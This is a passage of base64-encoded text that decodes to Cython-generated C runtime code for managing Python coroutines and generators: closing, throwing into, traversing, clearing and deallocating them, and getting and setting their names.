yb3V0aW5lX1NlbmRUb0RlbGVnYXRlKGdlbiwgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCwgUHlfTm9uZSwgJnJldHZhbCk7XG4gICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgaWYgKGdlbi0+eWllbGRmcm9tKSB7XG4gICAgICAgIFB5T2JqZWN0ICp5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgICAgICBQeU9iamVjdCAqcmV0O1xuICAgICAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRURcbiAgICAgICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfR2VuZXJhdG9yX05leHQoeWYpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgICAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgUHlfTm9uZSk7XG4gICAgICAgIH0gZWxzZVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMEEzIHx8ICFDWVRIT05fVVNFX0FNX1NFTkQpXG4gICAgICAgIGlmIChQeUdlbl9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCBOVUxMKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlJdGVyX05leHRfUGxhaW4oeWYpO1xuICAgICAgICBpZiAobGlrZWx5KHJldCkpIHtcbiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgICAgICAgICByZXR1cm4gcmV0O1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKGdlbiwgJnJldHZhbCk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIFB5X05vbmUsICZyZXR2YWwsIDApO1xuICAgIH1cbiAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMSk7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9DbG9zZV9NZXRob2QoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcpIHtcbiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGFyZyk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlKHNlbGYsICZyZXR2YWwpO1xuICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gUFlHRU5fRVJST1IpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICBQeV9YREVDUkVGKHJldHZhbCk7XG4gICAgUHlfUkVUVVJOX05PTkU7XG59XG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0XG5fX1B5eF9Db3JvdXRpbmVfQ2xvc2UoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICoqcmV0dmFsKSB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0ICopIHNlbGY7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqeWY7XG4gICAgaW50IGVyciA9IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkge1xuICAgICAgICAqcmV0dmFsID0gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgIGlmICh5Zikge1xuICAgICAgICBQeV9JTkNSRUYoeWYpO1xuICAgICAgICBlcnIgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2VJdGVyKGdlbiwgeWYpO1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgICAgICBQeV9ERUNSRUYoeWYpO1xuICAgIH1cbiAgICBpZiAoZXJyID09IDApXG4gICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfR2VuZXJhdG9yRXhpdCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIE5VTEwsIHJldHZhbCwgMSk7XG4gICAgaWYgKHJlc3VsdCA9PSBQWUdFTl9FUlJPUikge1xuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgaWYgKCFfX1B5eF9QeUVycl9PY2N1cnJlZCgpKSB7XG4gICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOO1xuICAgICAgICB9IGVsc2UgaWYgKGxpa2VseShfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzMihQeUV4Y19HZW5lcmF0b3JFeGl0LCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHtcbiAgICAgICAgICAgIF9fUHl4X1B5RXJyX0NsZWFyKCk7XG4gICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjtcbiAgICB9IGVsc2UgaWYgKGxpa2VseShyZXN1bHQgPT0gUFlHRU5fUkVUVVJOICYmICpyZXR2YWwgPT0gUHlfTm9uZSkpIHtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2Uge1xuICAgICAgICBjb25zdCBjaGFyICptc2c7XG4gICAgICAgIFB5X0RFQ1JFRigqcmV0dmFsKTtcbiAgICAgICAgKnJldHZhbCA9IE5VTEw7XG4gICAgICAgIGlmICgoMCkpIHtcbiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHNlbGYpKSB7XG4gICAgICAgICAgICBtc2cgPSAiY29yb3V0aW5lIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7XG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRFxuICAgICAgICB9IGVsc2UgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHtcbiAgICAgICAgICAgIG1zZyA9ICJhc3luYyBnZW5lcmF0b3IgaWdub3JlZCBHZW5lcmF0b3JFeGl0IjtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7XG4gICAgICAgIH1cbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgbXNnKTtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCwgUHlPYmplY3QgKnZhbCwgUHlPYmplY3QgKnRiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzLCBpbnQgY2xvc2Vfb25fZ2VuZXhpdCkge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmO1xuICAgIFB5T2JqZWN0ICp5ZjtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKVxuICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTtcbiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgIGlmICh5Zikge1xuICAgICAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCAqcmV0O1xuICAgICAgICBQeV9JTkNSRUYoeWYpO1xuICAgICAgICBpZiAoX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKHR5cCwgUHlFeGNfR2VuZXJhdG9yRXhpdCkgJiYgY2xvc2Vfb25fZ2VuZXhpdCkge1xuICAgICAgICAgICAgaW50IGVyciA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoZ2VuLCB5Zik7XG4gICAgICAgICAgICBQeV9ERUNSRUYoeWYpO1xuICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTtcbiAgICAgICAgICAgIGlmIChlcnIgPCAwKVxuICAgICAgICAgICAgICAgIGdvdG8gcHJvcGFnYXRlX2V4Y2VwdGlvbjtcbiAgICAgICAgICAgIGdvdG8gdGhyb3dfaGVyZTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoMFxuICAgICAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRURcbiAgICAgICAgICAgIHx8IF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgICAgICAgICB8fCBfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpXG4gICAgICAgICNlbmRpZlxuICAgICAgICAgICAgKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KHlmLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIGNsb3NlX29uX2dlbmV4aXQpO1xuICAgICAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVBd2FpdF9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfX0Nvcm91dGluZV9UaHJvdygoKF9fcHl4X0Nvcm91dGluZUF3YWl0T2JqZWN0Kil5ZiktPmNvcm91dGluZSwgdHlwLCB2YWwsIHRiLCBhcmdzLCBjbG9zZV9vbl9nZW5leGl0KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKHlmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyb3cpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtZXRoKSkge1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRih5Zik7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgICAgICAgICAgICAgIGdvdG8gdGhyb3dfaGVyZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmIChsaWtlbHkoYXJncykpIHtcbiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKG1ldGgsIGFyZ3MsIE5VTEwpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2FyZ3NbNF0gPSB7TlVMTCwgdHlwLCB2YWwsIHRifTtcbiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChtZXRoLCBjYXJncysxLCAzIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRoKTtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYoeWYpO1xuICAgICAgICBpZiAocmV0KSB7XG4gICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICAgICAgcmV0dXJuIHJldDtcbiAgICAgICAgfVxuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfRmluaXNoRGVsZWdhdGlvbihnZW4sICZyZXQpO1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXQsIDApO1xuICAgIH1cbnRocm93X2hlcmU6XG4gICAgX19QeXhfUmFpc2UodHlwLCB2YWwsIHRiLCBOVUxMKTtcbnByb3BhZ2F0ZV9leGNlcHRpb246XG4gICAge1xuICAgICAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBOVUxMLCAmcmV0dmFsLCAwKTtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KHNlbGYsIHJlc3VsdCwgcmV0dmFsLCAwKTtcbiAgICB9XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZ3MpIHtcbiAgICBQeU9iamVjdCAqdHlwO1xuICAgIFB5T2JqZWN0ICp2YWwgPSBOVUxMO1xuICAgIFB5T2JqZWN0ICp0YiA9IE5VTEw7XG4gICAgaWYgKHVubGlrZWx5KCFQeUFyZ19VbnBhY2tUdXBsZShhcmdzLCAidGhyb3ciLCAxLCAzLCAmdHlwLCAmdmFsLCAmdGIpKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmV0dXJuIF9fUHl4X19Db3JvdXRpbmVfVGhyb3coc2VsZiwgdHlwLCB2YWwsIHRiLCBhcmdzLCAxKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2VfZXhjc3RhdGUoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y192YWx1ZSk7XG4jZWxzZVxuICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3R5cGUpO1xuICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTtcbiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spO1xuI2VuZGlmXG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpIHtcbiAgICB7XG4gICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopZ2VuLCAxLCB2aXNpdCwgYXJnKTtcbiAgICAgICAgaWYgKGUpIHJldHVybiBlO1xuICAgIH1cbiAgICBQeV9WSVNJVChnZW4tPmNsb3N1cmUpO1xuICAgIFB5X1ZJU0lUKGdlbi0+Y2xhc3NvYmopO1xuICAgIFB5X1ZJU0lUKGdlbi0+eWllbGRmcm9tKTtcbiAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlX2V4Y3N0YXRlKCZnZW4tPmdpX2V4Y19zdGF0ZSwgdmlzaXQsIGFyZyk7XG59XG5zdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9jbGVhcihQeU9iamVjdCAqc2VsZikge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmO1xuICAgIFB5X0NMRUFSKGdlbi0+Y2xvc3VyZSk7XG4gICAgUHlfQ0xFQVIoZ2VuLT5jbGFzc29iaik7XG4gICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTtcbiAgICBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoJmdlbi0+Z2lfZXhjX3N0YXRlKTtcbiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHtcbiAgICAgICAgUHlfQ0xFQVIoKChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilnZW4pLT5hZ19maW5hbGl6ZXIpO1xuICAgIH1cbiNlbmRpZlxuICAgIFB5X0NMRUFSKGdlbi0+Z2lfY29kZSk7XG4gICAgUHlfQ0xFQVIoZ2VuLT5naV9mcmFtZSk7XG4gICAgUHlfQ0xFQVIoZ2VuLT5naV9uYW1lKTtcbiAgICBQeV9DTEVBUihnZW4tPmdpX3F1YWxuYW1lKTtcbiAgICBQeV9DTEVBUihnZW4tPmdpX21vZHVsZW5hbWUpO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX2RlYWxsb2MoUHlPYmplY3QgKnNlbGYpIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjtcbiAgICBQeU9iamVjdF9HQ19VblRyYWNrKGdlbik7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgaWYgKGdlbi0+Z2lfd2Vha3JlZmxpc3QgIT0gTlVMTClcbiAgICAjZW5kaWZcbiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcyhzZWxmKTtcbiAgICBpZiAoZ2VuLT5yZXN1bWVfbGFiZWwgPj0gMCkge1xuICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhzZWxmKTtcbiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAgICAgIGlmICh1bmxpa2VseShQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2Moc2VsZikpKVxuI2Vsc2VcbiAgICAgICAge1xuICAgICAgICAgICAgZGVzdHJ1Y3RvciBkZWwgPSBfX1B5eF9QeU9iamVjdF9HZXRTbG90KGdlbiwgdHBfZGVsLCBkZXN0cnVjdG9yKTtcbiAgICAgICAgICAgIGlmIChkZWwpIGRlbChzZWxmKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodW5saWtlbHkoUHlfUkVGQ05UKHNlbGYpID4gMCkpXG4jZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soc2VsZik7XG4gICAgfVxuI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkge1xuICAgICAgICBcbiAgICAgICAgUHlfQ0xFQVIoKChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmKS0+YWdfZmluYWxpemVyKTtcbiAgICB9XG4jZW5kaWZcbiAgICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoc2VsZik7XG4gICAgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwoZ2VuKTtcbn1cbiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfZGVsKFB5T2JqZWN0ICpzZWxmKSB7XG4gICAgUHlPYmplY3QgKmVycm9yX3R5cGUsICplcnJvcl92YWx1ZSwgKmVycm9yX3RyYWNlYmFjaztcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBpZiAoZ2VuLT5yZXN1bWVfbGFiZWwgPCAwKSB7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FcnJGZXRjaCgmZXJyb3JfdHlwZSwgJmVycm9yX3ZhbHVlLCAmZXJyb3JfdHJhY2ViYWNrKTtcbiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHtcbiAgICAgICAgX19weXhfUHlBc3luY0dlbk9iamVjdCAqYWdlbiA9IChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmO1xuICAgICAgICBQeU9iamVjdCAqZmluYWxpemVyID0gYWdlbi0+YWdfZmluYWxpemVyO1xuICAgICAgICBpZiAoZmluYWxpemVyICYmICFhZ2VuLT5hZ19jbG9zZWQpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpyZXMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGZpbmFsaXplciwgc2VsZik7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXJlcykpIHtcbiAgICAgICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihyZXMpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShlcnJvcl90eXBlLCBlcnJvcl92YWx1ZSwgZXJyb3JfdHJhY2ViYWNrKTtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgIH1cbiNlbmRpZlxuICAgIGlmICh1bmxpa2VseShnZW4tPnJlc3VtZV9sYWJlbCA9PSAwICYmICFlcnJvcl92YWx1ZSkpIHtcbiNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gICAgaWYgKCFfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdChzZWxmKSlcbiNlbmRpZlxuICAgICAgICB7XG4gICAgICAgIFB5T2JqZWN0X0dDX1VuVHJhY2soc2VsZik7XG4gICAgICAgIGlmICh1bmxpa2VseShQeUVycl9XYXJuRm9ybWF0KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAxLCAiY29yb3V0aW5lIFwnJS41MFNcJyB3YXMgbmV2ZXIgYXdhaXRlZCIsIGdlbi0+Z2lfcXVhbG5hbWUpIDwgMCkpXG4gICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7XG4gICAgICAgIFB5T2JqZWN0X0dDX1RyYWNrKHNlbGYpO1xuICAgICAgICB9XG4jZW5kaWZcbiAgICB9IGVsc2Uge1xuICAgICAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZShzZWxmLCAmcmV0dmFsKTtcbiAgICAgICAgaWYgKHJlc3VsdCA9PSBQWUdFTl9FUlJPUikge1xuICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHNlbGYpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlfWERFQ1JFRihyZXR2YWwpO1xuICAgICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0VyclJlc3RvcmUoZXJyb3JfdHlwZSwgZXJyb3JfdmFsdWUsIGVycm9yX3RyYWNlYmFjayk7XG59XG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9Db3JvdXRpbmVfZ2V0X25hbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCB2b2lkICpjb250ZXh0KVxue1xuICAgIFB5T2JqZWN0ICpuYW1lID0gc2VsZi0+Z2lfbmFtZTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTtcbiAgICBQeV9JTkNSRUYobmFtZSk7XG4gICAgcmV0dXJuIG5hbWU7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9Db3JvdXRpbmVfc2V0X25hbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwgfHwgIVB5VW5pY29kZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19uYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChzZWxmLT5naV9uYW1lLCB2YWx1ZSk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ29yb3V0aW5lX2dldF9xdWFsbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgUHlPYmplY3QgKm5hbWUgPSBzZWxmLT5naV9xdWFsbmFtZTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTtcbiAgICBQeV9JTkNSRUYobmFtZSk7XG4gICAgcmV0dXJuIG5hbWU7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9Db3JvdXRpbmVfc2V0X3F1YWxuYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIl9fcXVhbG5hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKHN